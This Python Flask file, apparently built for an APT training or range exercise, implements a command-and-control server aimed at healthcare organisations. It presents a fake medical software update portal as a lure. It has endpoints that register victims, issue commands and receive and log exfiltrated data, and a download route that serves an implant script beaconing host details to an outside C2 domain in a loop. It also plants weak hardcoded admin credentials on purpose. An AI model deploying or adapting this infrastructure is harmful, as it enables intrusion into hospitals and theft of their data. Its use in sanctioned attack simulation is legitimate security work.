#!/usr/bin/env python3
"""
APT C2服务器 - 模拟医疗行业APT攻击的命令控制服务器
包含预设漏洞用于演示
"""

from flask import Flask, request, jsonify, render_template_string
import json
import datetime
import os
import base64
import hashlib

app = Flask(__name__)

# 预设漏洞：弱认证
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"  # 弱密码

# 存储受害者信息
victims = {}
commands = {}
exfiltrated_data = []

# C2服务器状态
c2_status = {
    "campaign": os.getenv("CAMPAIGN_NAME", "MedicalShadow"),
    "target_sector": os.getenv("TARGET_SECTOR", "healthcare"),
    "active_victims": 0,
    "total_commands": 0,
    "data_exfiltrated": 0
}

@app.route('/')
def index():
    """主页 - 伪装成医疗软件更新站点"""
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Medical Software Updates</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .header { color: #2c5aa0; }
            .update-item { border: 1px solid #ddd; padding: 15px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <h1 class="header">Medical Software Update Center</h1>
        <p>Welcome to the secure medical software update portal.</p>
        
        <div class="update-item">
            <h3>HIS System Update v2.4.1</h3>
            <p>Critical security update for Hospital Information System</p>
            <a href="/download/his_update.exe">Download</a>
        </div>
        
        <div class="update-item">
            <h3>PACS Viewer Update v1.8.3</h3>
            <p>Enhanced DICOM image processing capabilities</p>
            <a href="/download/pacs_update.exe">Download</a>
        </div>
        
        <!-- 预设漏洞：管理面板链接暴露 -->
        <div style="margin-top: 50px; font-size: 10px; color: #ccc;">
            <a href="/admin">Admin Panel</a>
        </div>
    </body>
    </html>
    """)

@app.route('/admin')
def admin_panel():
    """预设漏洞：管理面板未授权访问"""
    auth = request.authorization
    if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
        return """
        <h1>Admin Login Required</h1>
        <p>Default credentials: admin/admin123</p>
        """, 401, {'WWW-Authenticate': 'Basic realm="Admin Panel"'}
    
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Admin Panel</title>
        <style>
            body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
            .status { border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
            .victim { background: #001100; padding: 5px; margin: 5px 0; }
        </style>
    </head>
    <body>
        <h1>{{ campaign }} - C2 Control Panel</h1>
        
        <div class="status">
            <h3>Campaign Status</h3>
            <p>Target Sector: {{ target_sector }}</p>
            <p>Active Victims: {{ active_victims }}</p>
            <p>Total Commands: {{ total_commands }}</p>
            <p>Data Exfiltrated: {{ data_exfiltrated }} MB</p>
        </div>
        
        <div class="status">
            <h3>Active Victims</h3>
            {% for victim_id, victim in victims.items() %}
            <div class="victim">
                <strong>{{ victim_id }}</strong> - {{ victim.hostname }} ({{ victim.ip }})
                <br>Last Seen: {{ victim.last_seen }}
                <br>Role: {{ victim.role }} | Department: {{ victim.department }}
            </div>
            {% endfor %}
        </div>
        
        <div class="status">
            <h3>Recent Commands</h3>
            {% for cmd in recent_commands %}
            <div>{{ cmd.timestamp }} - {{ cmd.command }} ({{ cmd.target }})</div>
            {% endfor %}
        </div>
    </body>
    </html>
    """, 
    campaign=c2_status["campaign"],
    target_sector=c2_status["target_sector"],
    active_victims=c2_status["active_victims"],
    total_commands=c2_status["total_commands"],
    data_exfiltrated=c2_status["data_exfiltrated"],
    victims=victims,
    recent_commands=list(commands.values())[-10:]  # 最近10条命令
    )

@app.route('/beacon', methods=['POST'])
def beacon():
    """受害者心跳包接收"""
    try:
        data = request.get_json()
        victim_id = data.get('victim_id')
        hostname = data.get('hostname')
        ip = data.get('ip')
        role = data.get('role', 'unknown')
        department = data.get('department', 'unknown')
        
        # 更新受害者信息
        victims[victim_id] = {
            'hostname': hostname,
            'ip': ip,
            'role': role,
            'department': department,
            'last_seen': datetime.datetime.now().isoformat()
        }
        
        c2_status["active_victims"] = len(victims)
        
        # 返回命令（如果有的话）
        pending_commands = []
        if victim_id in commands:
            pending_commands = [commands[victim_id]]
        
        return jsonify({
            'status': 'ok',
            'commands': pending_commands
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/exfiltrate', methods=['POST'])
def exfiltrate():
    """数据窃取接收端点"""
    try:
        data = request.get_json()
        victim_id = data.get('victim_id')
        data_type = data.get('data_type')
        data_content = data.get('data')
        
        # 存储窃取的数据
        exfil_record = {
            'victim_id': victim_id,
            'data_type': data_type,
            'size': len(data_content) if data_content else 0,
            'timestamp': datetime.datetime.now().isoformat(),
            'preview': data_content[:100] if data_content else ''
        }
        
        exfiltrated_data.append(exfil_record)
        c2_status["data_exfiltrated"] += exfil_record['size'] / (1024 * 1024)  # MB
        
        # 记录日志
        log_entry = f"[EXFIL] {victim_id} - {data_type} - {exfil_record['size']} bytes"
        with open('/var/c2/logs/exfiltration.log', 'a') as f:
            f.write(f"{datetime.datetime.now()} - {log_entry}\n")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/download/<filename>')
def download_payload(filename):
    """恶意载荷下载端点"""
    # 模拟恶意载荷
    payload_content = f"""
    # Simulated malicious payload: {filename}
    # This is a demonstration payload for APT attack simulation
    # Target: {c2_status['target_sector']}
    # Campaign: {c2_status['campaign']}
    
    import subprocess
    import requests
    import json
    import time
    
    # C2 communication
    C2_URL = "https://medical-updates.com"
    VICTIM_ID = "medical_ws_001"
    
    def beacon():
        data = {{
            "victim_id": VICTIM_ID,
            "hostname": subprocess.getoutput("hostname"),
            "ip": "192.168.100.20",
            "role": "doctor",
            "department": "internal_medicine"
        }}
        requests.post(f"{{C2_URL}}/beacon", json=data)
    
    # Start persistence
    while True:
        beacon()
        time.sleep(300)  # 5 minutes
    """
    
    return payload_content, 200, {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': f'attachment; filename={filename}'
    }

@app.route('/status')
def status():
    """C2服务器状态API"""
    return jsonify(c2_status)

if __name__ == '__main__':
    # 创建日志目录
    os.makedirs('/var/c2/logs', exist_ok=True)
    
    # 启动Flask应用
    app.run(host='0.0.0.0', port=8080, debug=False)
